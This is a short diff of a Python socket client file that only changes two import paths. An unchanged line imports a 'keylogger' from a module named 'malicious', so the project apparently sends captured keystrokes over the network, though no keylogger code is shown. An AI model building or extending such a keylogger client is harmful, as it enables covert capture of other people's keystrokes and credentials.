@@ -12,9 +12,9 @@ sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 's
 import threading
 import uuid
 from socket import socket, error, AF_INET, SOCK_STREAM
-from server.clnt.constants import EXIT, CLIENT_IP, PORT, NO_DATA, CHARS, FIRST, RANGE_POS_1, RANGE_POS_2, RANGE_POS_3
+from clnt.constants import EXIT, CLIENT_IP, PORT, NO_DATA, CHARS, FIRST, RANGE_POS_1, RANGE_POS_2, RANGE_POS_3
 from malicious import keylogger
-from server.clnt.protocol import Protocol
+from clnt.protocol import Protocol
 
 
 class Client:
